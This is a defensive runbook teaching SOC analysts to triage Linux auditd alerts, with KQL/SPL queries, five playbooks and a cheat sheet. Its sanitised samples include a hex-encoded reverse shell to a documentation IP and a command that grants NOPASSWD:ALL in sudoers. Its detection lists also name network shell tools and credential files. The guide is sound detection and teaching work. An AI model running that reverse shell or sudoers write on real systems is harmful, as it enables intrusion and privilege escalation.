# auditd for SOC Analysts: Runbook and Cheat Sheet

Oct 12, 2026 · @Joe

## How to use this guide

This guide gets an analyst who has never triaged Linux to a confident first call on an auditd alert. Read the four layers once, in order. After that, work from the playbook for the alert in front of you and keep the cheat sheet at the end open on shift.

- **Who it is for:** junior analysts, and experienced analysts who know Windows triage but not Linux.
- **What it assumes:** you can run a SIEM query and you know the SOC triage basics (scope, contain, escalate).
- **What it does not cover:** writing auditd rules from scratch or tuning kernel performance. Detection engineering owns those.

**Before you paste anything:** never put raw logs from a client or our estate into tickets, chat tools or AI assistants without sanitising them. Replace hostnames, usernames, IPs, file paths that name a client, and any command arguments that carry secrets.

This guide works with the audit rules your team has already deployed. Key names such as `actions` or `process_creation` are examples only: swap in the keys from your own rules (see Layer 3). Queries assume Sentinel (KQL) first with Splunk (SPL) alongside, and raw auditd shipped over syslog.

## Layer 1: What auditd is

**In one line:** auditd is the Linux kernel's own flight recorder. It writes down who ran what, which files they touched and which system calls they made, according to rules we give it.

**Analogy.** Think of a building's CCTV plus its door-badge log. The rules decide which doors have cameras. If a door has no camera, nothing is recorded, however bad the activity was. That is the single most important thing to remember: *no rule, no log*.

**Why it matters to the SOC.** Most Linux servers have no EDR, or an EDR with patchy coverage. auditd is often our only record of process execution, privilege changes and sensitive file access on those hosts. It is the Linux equivalent of Windows Security event 4688 (process creation) plus Sysmon file and registry events, but rule-driven.

**How it works, simply.**

1. An administrator loads **audit rules** (usually from `/etc/audit/rules.d/*.rules`).
2. The **kernel** checks every matching action against those rules and emits audit records.
3. The **auditd daemon** writes the records to `/var/log/audit/audit.log`.
4. A **forwarder** (the audisp syslog plugin, Azure Monitor Agent, the Splunk Universal Forwarder, or Laurel) ships them to the SIEM.
5. **Analytics rules** in the SIEM match on the rule *key* or on fields, and raise the alert you are triaging.

**Jargon you will meet**

| Term | Plain English |
| --- | --- |
| System call (syscall) | A request a program makes to the kernel, such as "run this program" (`execve`) or "open this file" (`openat`). |
| Rule | An instruction to auditd: "record it when X happens". |
| Watch | A rule on a file or folder: "record reads, writes, executes or attribute changes here". |
| Key (`-k`) | A label the rule author attaches, such as `priv_esc`. It tells you *why* an event was recorded. |
| Record | One line in `audit.log`, with a `type=`. |
| Event | Several records that share one serial number. Together they describe one action. |
| UID / EUID | The user ID a process runs as / the effective user ID it currently has rights of. `0` is root. |
| AUID | The *audit* or *login* user ID: who originally logged in. It survives `sudo` and `su`. |
| TTY | The terminal. A value like `pts/0` means an interactive session; `(none)` means no terminal, typical of services and cron. |

## Layer 2: Reading an auditd event

One action on the host becomes several log lines. Your first job is to stitch them back together using the serial number, then read five fields: `key`, `auid`, `euid`, `exe` and the command line.

### Stitch records into one event

Every record starts with `msg=audit(<epoch time>:<serial>)`. Records with the **same serial** are one event. In the example below every line carries `1791796443.512:48213`, so all four describe a single program launch.

```text
type=SYSCALL msg=audit(1791796443.512:48213): arch=c000003e syscall=59 success=yes exit=0 ppid=2214 pid=2390 auid=1001 uid=33 gid=33 euid=33 tty=(none) ses=4 comm="bash" exe="/usr/bin/bash" key="process_creation"
type=EXECVE msg=audit(1791796443.512:48213): argc=3 a0="bash" a1="-c" a2=62617368202D69203E26202F6465762F7463702F3230332E302E3131332E31302F3434343420303E2631
type=CWD msg=audit(1791796443.512:48213): cwd="/var/www/html/uploads"
type=PROCTITLE msg=audit(1791796443.512:48213): proctitle=62617368002D630062617368202D69203E26202F6465762F7463702F3230332E302E3131332E31302F3434343420303E2631
```

This is a sanitised teaching sample. Hosts, IDs and the 203.0.113.0/24 documentation address are made up.

### The record types you will see most

| `type=` | What it tells you |
| --- | --- |
| `SYSCALL` | The core record: which syscall, did it succeed, who (auid, uid, euid), which program (`exe`, `comm`), parent PID, terminal, and the rule `key`. |
| `EXECVE` | The full command line, one argument per field (`a0`, `a1`, ...). Only present when a program was run. |
| `PATH` | Each file the syscall touched, with its owner and permissions. A watch on `/etc/shadow` produces one. |
| `CWD` | The working directory. Useful: `/tmp`, `/dev/shm` and web upload folders are red flags. |
| `PROCTITLE` | The process title (the command line), usually hex-encoded with null bytes between arguments. |
| `USER_CMD` | A command run through `sudo`, with who ran it. |
| `USER_LOGIN`, `USER_AUTH`, `USER_START` | Logins, authentication attempts and session starts, including over SSH. |
| `ADD_USER`, `ADD_GROUP`, `DEL_USER` | Account changes made through the standard tools. |
| `CONFIG_CHANGE`, `DAEMON_END` | Audit rules changed or the audit daemon stopped. Always worth a look. |

### The fields that matter

| Field | Read it as | Example meaning |
| --- | --- | --- |
| `key` | Why this was logged | `process_creation`: the catch-all "a program ran" rule. |
| `auid` | Who logged in originally | `1001`: a real user account. `4294967295` (or `unset`, `-1`): no login session, so a service, cron or a process spawned by a daemon such as a web server. |
| `uid` / `euid` | Whose rights the process has now | `uid=33` is `www-data` on Debian and Ubuntu. `euid=0` is root. |
| `exe` / `comm` | The program on disk / its short name | `/usr/bin/bash` / `bash`. |
| `success` / `exit` | Did it work | `success=no exit=-13` is "permission denied". |
| `ppid` / `pid` | Parent and own process ID | Use `ppid` to walk up the process tree. |
| `tty` | Interactive or not | `pts0` = a human at a terminal. `(none)` = a service or script. |
| `ses` | Login session number | Groups every action from one login. |
| `syscall` | Which kernel call, by number | On 64-bit x86 (`arch=c000003e`): 59 = `execve`, 42 = `connect`, 257 = `openat`. Numbers differ on ARM. |

### Decode the hex

auditd hex-encodes any value containing spaces, quotes or odd characters, which is exactly the interesting stuff. Never triage an `EXECVE` or `PROCTITLE` without decoding it.

- **On the host:** `ausearch -i --event 48213` prints the event with hex decoded and IDs turned into names.
- **In a sandbox shell:** `echo <hex> | xxd -r -p | tr '\0' ' '`
- **In CyberChef:** the *From Hex* recipe.
- **In KQL / SPL:** see the helper queries in the triage workflow below.

Decoded, the example reads `bash -c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`. Put that together with `uid=33`, `auid=unset`, `tty=(none)` and a working directory under the web root, and the story is clear: **the web server account spawned an interactive shell that connects out to an external IP**. That is a reverse shell from a likely web exploit, and it is a priority incident.

## Layer 3: Rules and keys

The `key` on an event is the rule author telling you why they cared. Learn to read a rule and you can work out what an alert means even when no playbook exists.

### Two kinds of rule

```text
# A watch: record writes (w) and attribute changes (a) to /etc/sudoers
-w /etc/sudoers -p wa -k actions

# A syscall rule: record every successful IPv4 outbound connect()
-a always,exit -F arch=b64 -S connect -F a2=16 -F success=1 -F key=network_connect_4
```

| Part | Meaning |
| --- | --- |
| `-w <path>` | Watch this file or folder. |
| `-p rwxa` | Which access to record: read, write, execute, attribute change. |
| `-a always,exit` | Always record this syscall when it finishes. |
| `-S <syscall>` | Which syscall, such as `execve`, `connect`, `openat`. |
| `-F <field>=<value>` | Filters, such as `auid>=1000` (real users only) or `success=0` (failures only). |
| `-k <name>` | The key that ends up on the event. |

To see what is live on a host, run `auditctl -l`. Never assume the file on disk matches what is loaded.

### Map your own keys

Our rules are already defined, so this table is a template. Pull the live key list with `auditctl -l | grep -o 'key=[^ ]*' | sort -u` (or from `/etc/audit/rules.d/`), then replace each example key below with ours. Keep the *triage meaning* column: that is what analysts need.

| Example key (replace with ours) | What triggers it | Triage meaning |
| --- | --- | --- |
| `process_creation` | Every `execve` | Your process log. Context for everything else; too noisy to alert on alone. |
| `etcpasswd`, `etcgroup` | Writes to `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/gshadow` | Accounts or passwords changed. |
| `actions` | Writes to `/etc/sudoers` or `/etc/sudoers.d/` | Someone changed who can become root. |
| `power_abuse` | Root touching files in another user's home folder, after a real user logged in | Admin snooping, or an attacker with root reading user data. |
| `cron` | Writes to cron and at files | Scheduled-task persistence. |
| `systemd`, `init` | Writes to systemd unit folders, `/etc/init.d`, `rc.local` | Service persistence. |
| `shell_profiles` | Writes to `/etc/profile`, `/etc/profile.d/`, `/etc/bashrc` | Code that runs at every login. |
| `rootkey`, `sshd` | Writes to `/root/.ssh` or `/etc/ssh/` | SSH key or SSH config persistence. |
| `systemwide_preloads`, `libpath` | Writes to `/etc/ld.so.preload` or linker config | Library injection, a common rootkit trick. |
| `modules` | Kernel modules loaded or removed | Possible rootkit; rare on most servers. |
| `auditlog`, `auditconfig`, `audispconfig` | Access to audit logs or audit config | Covering tracks. |
| `T1070_006_timestomp` | File timestamps changed by a real user | Hiding when a file was dropped. |
| `tracing` | `ptrace` calls | Debugging, or process injection and credential theft from memory. |
| `anon_file_create` | `memfd_create` | Fileless execution, but also normal for some browsers and runtimes. |
| `network_connect_4`, `network_connect_6` | Successful outbound connects | Network context, like a lightweight netflow. |
| `unauthedfileaccess` | A real user failing to open files in system folders | Probing, or a misconfigured script. |
| `perm_mod` | `chmod`, `chown` or extended attribute changes by real users | Making a payload executable, or setuid tricks. |
| `pam`, `login`, `session` | Authentication config and login records changed | Backdoored authentication or log tampering. |

**Gap to know about:** if a technique has no rule, you will see nothing. Absence of an auditd alert is not evidence of absence. Check rule coverage before you close anything as "no activity found".

## Layer 4: The triage workflow for any auditd alert

Every auditd alert gets the same seven questions, in this order. Write the answer to each in the ticket, even when it is "not applicable". That makes handover and peer review easy.

1. **Stitch and decode.** Pull every record with the alert's serial number and decode any hex. You cannot judge a command you have not read.
2. **Who?** Compare `auid` with `uid`/`euid`.
   - Real `auid` (1000 or above) and `euid=0`: a named person became root. Who are they, and are they an admin?
   - `auid` unset and a service `uid` (`www-data`, `apache`, `nginx`, `tomcat`, `postgres`): a service did this on its own. A service running a shell is a red flag.
   - `auid` unset and `uid=0` with `tty=(none)`: cron, systemd or an agent. Check which one in the parent chain.
3. **What?** Read `exe`, the full command line, `cwd` and any `PATH` records. Ask whether this program normally does this on this host.
4. **What launched it?** Walk up the process tree using `ppid` (queries below). Note that PIDs are reused, so keep your time window tight. Find the login: `ses` plus `USER_LOGIN` or `USER_AUTH` records show the source IP for SSH.
5. **Was it expected?** Check for a change ticket, a patch window, configuration management (Ansible, Puppet, Chef, Salt), package installs (`dpkg`, `rpm`, `yum`, `apt`) or a known admin. Ask the system owner if you cannot tell.
6. **How far does it go?** Search the same `auid` and `ses` for an hour either side. Search the same command or hash on every other Linux host. Look for outbound connections (`network_connect_4`) from the same process.
7. **Decide and record.** Close as benign with the specific reason, escalate as suspicious, or declare an incident and contain. "Looks like admin activity" is not a reason; "jsmith ran it under CHG012345" is.

### Helper queries: pull the whole event and decode it

**Sentinel (KQL), raw auditd in the `Syslog` table.** Replace the host, time and serial.

```kusto
let host = "web01";
let serial = "48213";
Syslog
| where TimeGenerated between (datetime(2026-10-12 09:00) .. datetime(2026-10-12 09:30))
| where Computer == host and SyslogMessage has "audit("
| extend Serial  = extract(@"audit\(\d+\.\d+:(\d+)\)", 1, SyslogMessage),
         RecType = extract(@"type=(\w+)", 1, SyslogMessage),
         HexCmd  = extract(@"proctitle=([0-9A-F]+)", 1, SyslogMessage)
| where Serial == serial
| extend Decoded = iff(isnotempty(HexCmd),
    url_decode(replace_string(replace_regex(HexCmd, @"([0-9A-F]{2})", @"%\1"), "%00", "%20")), "")
| project TimeGenerated, RecType, SyslogMessage, Decoded
```

**Splunk (SPL), Splunk Add-on for Unix and Linux** (`sourcetype=linux_audit`).

```spl
index=linux sourcetype=linux_audit host=web01 earliest="10/12/2026:09:00:00" latest="10/12/2026:09:30:00"
| rex "audit\(\d+\.\d+:(?<serial>\d+)\)"
| search serial=48213
| rex "proctitle=(?<hexcmd>[0-9A-F]+)"
| eval decoded=if(isnotnull(hexcmd), urldecode(replace(replace(hexcmd, "([0-9A-F]{2})", "%\1"), "%00", "%20")), null())
| table _time type _raw decoded
```

If you use **Laurel**, it already groups records into one JSON event per serial and decodes command lines, so skip the decoding step.

### Helper queries: walk the process tree

Find the parent (the process whose `pid` equals your alert's `ppid`) and any children (processes whose `ppid` equals your alert's `pid`).

```kusto
let host = "web01"; let alertPid = "2390"; let alertPpid = "2214";
Syslog
| where TimeGenerated between (datetime(2026-10-12 08:00) .. datetime(2026-10-12 10:00))
| where Computer == host and SyslogMessage has "type=SYSCALL"
| extend Pid  = extract(@" pid=(\d+)", 1, SyslogMessage),
         Ppid = extract(@" ppid=(\d+)", 1, SyslogMessage),
         Exe  = extract(@"exe=\"([^\"]+)\"", 1, SyslogMessage),
         Auid = extract(@"auid=(\d+)", 1, SyslogMessage)
| where Pid == alertPpid or Ppid == alertPid
| project TimeGenerated, Pid, Ppid, Exe, Auid, SyslogMessage
| order by TimeGenerated asc
```

```spl
index=linux sourcetype=linux_audit host=web01 type=SYSCALL earliest=-2h
| rex " pid=(?<pid>\d+)" | rex " ppid=(?<ppid>\d+)"
| search pid=2214 OR ppid=2390
| table _time pid ppid exe auid uid comm key
```

### On the host, if your runbook allows live response

Only with IR approval, and record every command you run.

| Command | Use |
| --- | --- |
| `ausearch -i --event 48213` | One event, decoded, with names instead of IDs. |
| `ausearch -i -k actions -ts today` | Everything for one key today. |
| `ausearch -i -ua 1001 -ts recent` | Everything by one login user in the last 10 minutes. |
| `aureport -x --summary` | Most-run programs. Good for spotting the odd one out. |
| `aureport -l --failed` | Failed logins. |
| `auditctl -s` / `auditctl -l` | Is auditing on, how many events were lost, and which rules are loaded. |

## Playbooks by alert type

Five playbooks, in suggested rollout order: suspicious execution, privilege escalation, persistence, audit tampering, credential access. Each gives the ATT&CK mapping, what the alert looks like, a starter query, likely false positives and when to escalate.

Key names in the queries are examples. Replace them with our keys from the Layer 3 table before saving any query as an analytics rule.

### Shared parser (save once as a Sentinel function)

Save this as a workspace function called `AuditdSyscall` so every query below stays short. In Splunk, the Add-on for Unix and Linux already extracts these fields.

```kusto
Syslog
| where SyslogMessage has "type=SYSCALL"
| extend Serial  = extract(@"audit\(\d+\.\d+:(\d+)\)", 1, SyslogMessage),
         Key     = extract(@"key=\"([^\"]+)\"", 1, SyslogMessage),
         Exe     = extract(@"exe=\"([^\"]+)\"", 1, SyslogMessage),
         Comm    = extract(@"comm=\"([^\"]+)\"", 1, SyslogMessage),
         Auid    = extract(@" auid=(\d+)", 1, SyslogMessage),
         Uid     = extract(@" uid=(\d+)", 1, SyslogMessage),
         Euid    = extract(@" euid=(\d+)", 1, SyslogMessage),
         Pid     = extract(@" pid=(\d+)", 1, SyslogMessage),
         Ppid    = extract(@" ppid=(\d+)", 1, SyslogMessage),
         Tty     = extract(@" tty=(\S+)", 1, SyslogMessage),
         Success = extract(@"success=(\w+)", 1, SyslogMessage)
| extend Interactive = Tty != "(none)", NoLogin = Auid == "4294967295"
```

### A. Suspicious execution: a service spawns a shell

**ATT&CK:** [T1059.004 Unix Shell](https://attack.mitre.org/techniques/T1059/004/), often after [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) or via a [T1505.003 Web Shell](https://attack.mitre.org/techniques/T1505/003/).

**What it looks like:** the reverse-shell sample in Layer 2. A web, database or application service account, with no login session, runs `sh` or `bash`. Command lines that contain `/dev/tcp/`, `nc -e`, `mkfifo`, `socat`, `python -c` with `socket`, or `curl ... | sh` push this to critical.

```kusto
AuditdSyscall
| where TimeGenerated > ago(1h)
| where Key == "process_creation" and NoLogin and Uid != "0"
| where Exe in ("/usr/bin/bash", "/bin/bash", "/usr/bin/sh", "/bin/sh", "/usr/bin/dash", "/bin/dash")
| summarize Count = count(), FirstSeen = min(TimeGenerated) by Computer, Uid, Exe, Ppid
```

```spl
index=linux sourcetype=linux_audit type=SYSCALL key="process_creation" auid=4294967295 uid!=0
    exe IN ("/usr/bin/bash", "/bin/bash", "/usr/bin/sh", "/bin/sh", "/usr/bin/dash", "/bin/dash")
| stats count min(_time) as first_seen by host uid exe ppid
```

**Check next:** decode the command line; walk up to the parent (is it `apache2`, `nginx`, `php-fpm`, `java`?); look for `network_connect_4` from the same PID; list files written in web roots and `/tmp` around that time; check web access logs for the request that triggered it.

**Likely false positives:** applications that legitimately shell out (PHP `exec()` for image tools, Java apps running scripts, monitoring agents). **Tuning:** allowlist by host plus exact parent plus exact decoded command, never by shell alone.

**Escalate immediately** when the command makes an outbound connection, downloads and runs something, or runs from a web upload folder. Contain by isolating the host or blocking its egress, and preserve the web logs.

### B. Privilege escalation: sudoers, accounts and setuid

**ATT&CK:** [T1548.003 Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/), [T1136.001 Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/), [T1098 Account Manipulation](https://attack.mitre.org/techniques/T1098/), [T1548.001 Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/).

**What it looks like:** a write to `/etc/sudoers` or `/etc/sudoers.d/` (key `actions`), a write to `/etc/passwd`, `/etc/shadow` or `/etc/group` (keys `etcpasswd`, `etcgroup`), or an `ADD_USER` record. The giveaway is *which program* made the change.

```text
# Sanitised sample, decoded: a new file dropped in sudoers.d by a shell, not by visudo
type=SYSCALL ... syscall=257 success=yes uid=0 euid=0 auid=1004 tty=pts1 comm="bash" exe="/usr/bin/bash" key="actions"
type=PATH ... name="/etc/sudoers.d/99-svc" nametype=CREATE
type=PROCTITLE ... (decoded) bash -c echo "svc_backup ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/99-svc
```

```kusto
AuditdSyscall
| where TimeGenerated > ago(1h)
| where Key in ("actions", "etcpasswd", "etcgroup") and Success == "yes"
| where Exe !in ("/usr/sbin/visudo", "/usr/sbin/useradd", "/usr/sbin/usermod", "/usr/sbin/userdel",
                 "/usr/sbin/groupadd", "/usr/sbin/groupmod", "/usr/bin/passwd", "/usr/sbin/chpasswd",
                 "/usr/bin/dpkg", "/usr/bin/rpm")
| project TimeGenerated, Computer, Key, Exe, Comm, Auid, Euid, Tty, SyslogMessage
```

```spl
index=linux sourcetype=linux_audit type=SYSCALL key IN ("actions", "etcpasswd", "etcgroup") success=yes
    NOT exe IN ("/usr/sbin/visudo", "/usr/sbin/useradd", "/usr/sbin/usermod", "/usr/sbin/userdel",
                "/usr/sbin/groupadd", "/usr/sbin/groupmod", "/usr/bin/passwd", "/usr/sbin/chpasswd",
                "/usr/bin/dpkg", "/usr/bin/rpm")
| table _time host key exe comm auid euid tty
```

**Check next:** which `auid` made the change, and from which SSH source; what the new line grants (`NOPASSWD:ALL` or a new UID 0 account is critical); `USER_CMD` records for the same user; whether `perm_mod` shows `chmod` with the setuid bit (`u+s`, or a mode such as `4755`) on a non-standard binary.

**Likely false positives:** configuration management (Ansible often writes through `python3`), image builds, and admins editing by hand under change control. **Tuning:** allowlist the config management service account and host group, not the `exe` alone, because `python3` is also an attacker favourite.

**Escalate** any unexplained new UID 0 account, any `NOPASSWD` grant without a change ticket, or any change made by a service account. Contain by disabling the account and reverting the file, after taking a copy as evidence.

### C. Persistence: cron, systemd, SSH keys, profiles and preload

**ATT&CK:** [T1053.003 Cron](https://attack.mitre.org/techniques/T1053/003/), [T1543.002 Systemd Service](https://attack.mitre.org/techniques/T1543/002/), [T1098.004 SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004/), [T1546.004 Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/), [T1574.006 Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006/).

**What it looks like:** a write under keys `cron`, `systemd`, `init`, `rootkey`, `sshd`, `shell_profiles`, `systemwide_preloads` or `libpath`. Again, *who and which program* matters more than the file. Any write to `/etc/ld.so.preload` is rare enough to treat as high severity on its own.

```kusto
AuditdSyscall
| where TimeGenerated > ago(1h)
| where Key in ("cron", "systemd", "init", "rootkey", "sshd", "shell_profiles", "systemwide_preloads", "libpath")
| where Success == "yes"
| where Exe !in ("/usr/bin/dpkg", "/usr/bin/rpm", "/usr/bin/crontab", "/usr/lib/systemd/systemd", "/usr/bin/systemctl")
| summarize Events = count(), Keys = make_set(Key), Exes = make_set(Exe) by Computer, Auid, bin(TimeGenerated, 10m)
```

```spl
index=linux sourcetype=linux_audit type=SYSCALL success=yes
    key IN ("cron", "systemd", "init", "rootkey", "sshd", "shell_profiles", "systemwide_preloads", "libpath")
    NOT exe IN ("/usr/bin/dpkg", "/usr/bin/rpm", "/usr/bin/crontab", "/usr/lib/systemd/systemd", "/usr/bin/systemctl")
| bin _time span=10m
| stats count values(key) as keys values(exe) as exes by _time host auid
```

**Check next:** read the new or changed file (cron line, unit file `ExecStart=`, the added SSH key's comment and fingerprint); check whether the referenced script lives in `/tmp`, `/dev/shm`, `/var/tmp` or a hidden folder; check whether a service or timer was enabled straight after (`systemctl` in `process_creation`).

**Check your coverage:** confirm our rules watch every user's `~/.ssh/authorized_keys`, not only `/root/.ssh`. Many rule sets only cover root, so a new key on a compromised user account would not alert. If it is missing, raise it with detection engineering.

**Likely false positives:** package installs and upgrades (on RHEL-family hosts `yum` and `dnf` run as `python3`), configuration management, and admins using `crontab -e`. **Tuning:** suppress during approved patch windows by host group, not permanently.

**Escalate** any persistence created by a service account, from a temporary folder, or within an hour of an alert from Playbook A or B. Do not remove the persistence before evidence is captured and IR agrees, or you tip off the attacker.

### D. Audit tampering: someone is turning the cameras off

**ATT&CK:** [T1562.012 Disable or Modify Linux Audit System](https://attack.mitre.org/techniques/T1562/012/), [T1070.002 Clear Linux or Mac System Logs](https://attack.mitre.org/techniques/T1070/002/), [T1070.006 Timestomp](https://attack.mitre.org/techniques/T1070/006/).

**What it looks like:** a `CONFIG_CHANGE` record (rules deleted or auditing disabled, for example `auditctl -D` or `auditctl -e 0`), a `DAEMON_END` or `SERVICE_STOP` for `auditd`, writes under keys `auditconfig`, `audispconfig` or `auditlog`, a `T1070_006_timestomp` event, or the host simply going quiet.

```kusto
// Config changes and daemon stops (these are not SYSCALL records)
Syslog
| where TimeGenerated > ago(1h)
| where SyslogMessage has_any ("type=CONFIG_CHANGE", "type=DAEMON_END", "type=DAEMON_ABORT")
    or (SyslogMessage has "type=SERVICE_STOP" and SyslogMessage has "unit=auditd")
| project TimeGenerated, Computer, SyslogMessage
```

```kusto
// Linux hosts that stopped sending audit events (silence is a signal)
Syslog
| where TimeGenerated > ago(1d) and SyslogMessage has "audit("
| summarize LastSeen = max(TimeGenerated) by Computer
| where LastSeen < ago(30m)
```

```spl
index=linux sourcetype=linux_audit (type=CONFIG_CHANGE OR type=DAEMON_END OR type=DAEMON_ABORT OR (type=SERVICE_STOP unit=auditd))
| table _time host type _raw
```

```spl
| tstats latest(_time) as last_seen where index=linux sourcetype=linux_audit earliest=-1d by host
| where last_seen < relative_time(now(), "-30m")
```

**Check next:** who ran it (`auid`, `ses`, SSH source); what happened in the minutes *before* the change, because that is what the attacker wanted hidden; whether `auditctl -s` shows `enabled 0` or a high `lost` count; whether other hosts went quiet at the same time (a forwarder or network fault looks the same).

**Likely false positives:** planned `auditd` restarts and rule reloads during patching, `augenrules --load` by configuration management, log rotation by `auditd` itself, and SIEM or backup agents reading `/var/log/audit` (the `auditlog` watch includes reads). **Tuning:** allowlist the agents' `exe` for `auditlog` reads only; never suppress `CONFIG_CHANGE` outright.

**Escalate** any unplanned rule deletion or audit stop as a probable compromise. Treat everything from that host after the change as untrusted, and get IR to collect from the host directly.

### E. Credential access: shadow file, keys and process memory

**ATT&CK:** [T1003.008 /etc/passwd and /etc/shadow](https://attack.mitre.org/techniques/T1003/008/), [T1552.004 Private Keys](https://attack.mitre.org/techniques/T1552/004/), [T1003.007 Proc Filesystem](https://attack.mitre.org/techniques/T1003/007/).

**What it looks like:** a real user failing to open files under `/etc` (`unauthedfileaccess`, `success=no`), `ptrace` activity (`tracing`) from an unexpected program, or a `process_creation` command line that mentions `/etc/shadow`, `unshadow`, `id_rsa`, or `/proc/<pid>/mem`.

**Check your coverage, the most important check in this guide:** many rule sets watch `/etc/shadow` for *writes* (`-p wa`) but not *reads*. If ours does the same, a root attacker who copies the file to crack hashes offline leaves no event. Confirm with `auditctl -l | grep shadow`. If reads are not covered, raise it with detection engineering and rely on the command-line hunt below.

```kusto
// Failed access to /etc by real users, grouped per user and host
AuditdSyscall
| where TimeGenerated > ago(1h)
| where Key == "unauthedfileaccess" and Success == "no"
| summarize Failures = count(), Exes = make_set(Exe) by Computer, Auid, bin(TimeGenerated, 15m)
| where Failures > 5
```

```kusto
// Decoded command lines that touch credential material
Syslog
| where TimeGenerated > ago(1h) and SyslogMessage has "type=PROCTITLE"
| extend HexCmd = extract(@"proctitle=([0-9A-F]+)", 1, SyslogMessage)
| extend Cmd = iff(isnotempty(HexCmd),
    url_decode(replace_string(replace_regex(HexCmd, @"([0-9A-F]{2})", @"%\1"), "%00", "%20")),
    extract(@"proctitle=\"?([^\"]+)", 1, SyslogMessage))
| where Cmd has_any ("/etc/shadow", "unshadow", "id_rsa", "id_ed25519", "/proc/", ".ssh/")
| project TimeGenerated, Computer, Cmd, SyslogMessage
```

```spl
index=linux sourcetype=linux_audit type=PROCTITLE
| rex "proctitle=(?<hexcmd>[0-9A-F]+)"
| eval cmd=coalesce(urldecode(replace(replace(hexcmd, "([0-9A-F]{2})", "%\1"), "%00", "%20")), proctitle)
| search cmd="*/etc/shadow*" OR cmd="*unshadow*" OR cmd="*id_rsa*" OR cmd="*id_ed25519*" OR cmd="*.ssh/*"
| table _time host cmd
```

**Check next:** was the attempt successful (any `success=yes` around it)?; did the same user run `sudo` shortly after; did the host make outbound connections or write archives (`tar`, `zip`) next; which other hosts the same account logged into.

**Likely false positives:** PAM helpers such as `unix_chkpwd`, backup and vulnerability-scanning agents, `sshd` reading host keys, and admins checking key permissions. **Tuning:** allowlist by `exe` plus `auid` for scanners; keep human interactive sessions in scope.

**Escalate** any successful read of `/etc/shadow` or private keys by a non-admin or a service, and any `ptrace` attach to `sshd`, `sudo` or another user's process. Assume the credentials are compromised and start resets for the accounts on that host.

## Escalation and UK reporting

Analysts escalate; they do not make regulatory calls. Your job is to get the right facts to the shift lead or IR fast, with times recorded, because UK reporting clocks start from when the organisation becomes aware.

| Severity | Examples from the playbooks | Analyst action |
| --- | --- | --- |
| Critical: page IR now | Reverse shell or download-and-run from a service (A); audit rules deleted or auditd stopped without a change (D); successful `/etc/shadow` or private key read by a non-admin (E) | Phone or page the shift lead and IR. Start the incident ticket with times. Do not touch the host unless the runbook says so. |
| High: escalate within the shift | Unexplained `NOPASSWD` grant or new UID 0 account (B); persistence from a temp folder or service account (C); `ld.so.preload` written (C) | Escalate to the shift lead with the seven triage answers. Ask the system owner about change control. |
| Medium: investigate and decide | Service shell with a plausible business reason (A); config change by a known admin with no ticket (B, C) | Confirm with the system owner. Close with a specific reason, or escalate. |
| Low: tune | Repeated, explained noise from agents or config management | Close with the reason and raise a tuning request with the evidence. |

### UK obligations the shift lead will weigh

- **UK GDPR (ICO):** if personal data may have been accessed, the organisation must report a notifiable breach to the ICO within 72 hours of becoming aware. Note when awareness started. [ICO guidance](https://ico.org.uk/for-organisations/report-a-breach/).
- **NIS Regulations 2018:** operators of essential services and relevant digital service providers report significant incidents to their competent authority within 72 hours.
- **Cyber Security and Resilience Bill:** still going through Parliament as of October 2026 (Lords Committee stage began 1 September 2026). As drafted, in-scope organisations, including managed service providers, would send an initial notice within 24 hours and a full report within 72 hours to their regulator and the NCSC. [GOV.UK factsheet](https://www.gov.uk/government/publications/deleted-cyber-security-and-resilience-network-and-information-systems-bill-factsheets/incident-reporting). Check its status before relying on it.
- **NCSC:** significant incidents can be reported to the NCSC directly at [report.ncsc.gov.uk](https://report.ncsc.gov.uk/).
- **Client contracts:** if you are an MSSP, the client contract usually sets a shorter notification time than the law. Know it before your shift.

## Check your understanding

Work through these before your first solo auditd alert. Answers follow.

1. An event shows `auid=1002 uid=0 euid=0 tty=pts0 exe="/usr/bin/vim" key="actions"`. In one sentence, what happened?
2. Three lines share `audit(1791796500.104:51022)` and a fourth has `audit(1791796500.104:51023)`. How many events is that?
3. `uid=48` (`apache`) runs `/usr/bin/curl` and then `/usr/bin/sh`, both with `auid=4294967295`. Which playbook, and what severity until proven otherwise?
4. Your SIEM shows no `etcpasswd` events from a host where IR suspects `/etc/shadow` was stolen. Does that clear the host? Why?
5. A `CONFIG_CHANGE` fires at 02:00 on a Sunday. Name two things you check before escalating.

**Answers**

1. User 1002 logged in interactively, became root, and edited the sudoers file with vim.
2. Two events: serial 51022 and serial 51023.
3. Playbook A, critical until proven otherwise: a web service fetching something then starting a shell is the classic web-exploit pattern.
4. No. If our rules only record writes to `/etc/shadow`, a read leaves no event at all. Hunt the command lines instead and raise the coverage gap.
5. Any of: a change ticket or patch window; who ran it (`auid`, SSH source); whether other hosts changed at the same time; what the host did in the minutes before.

### Next steps for analysts

- **Lab:** build a throwaway Ubuntu VM, install `auditd`, load a copy of our production audit rules, then run harmless commands (`sudo -l`, `crontab -e`, `cat /etc/passwd`) and read the results with `ausearch -i`.
- **Practice:** use the [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) tests for Linux in that lab VM only, and check which ones auditd catches.
- **Read:** the [Red Hat guide to the Linux audit system](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/security_hardening/auditing-the-system_security-hardening) for field meanings and record types.
- **Related topics:** Linux process trees and `/proc`; SSH log analysis in `/var/log/auth.log` or `/var/log/secure`; Sigma rules for auditd in the [SigmaHQ repository](https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd).

## Cheat sheet: auditd on one page

**Golden rules:** same serial = same event. Decode the hex before you judge. `auid` is who logged in; `euid` is whose power they have now. No rule, no log.

### Read the fields

| Field | Red flag |
| --- | --- |
| `auid=4294967295` with a shell in `exe` | A service ran a shell on its own. |
| `auid` 1000+ and `euid=0` | A named person is acting as root. Who and why? |
| `tty=(none)` | Not a human at a keyboard: service, cron or exploit. |
| `cwd` in `/tmp`, `/dev/shm`, `/var/tmp`, web roots | Staging folders for payloads. |
| `success=no` repeated | Probing or guessing. |
| `exe` is `bash`, `python3`, `perl`, `vi`, `sed` writing to `/etc` | Hand-made change, not a package or admin tool. |

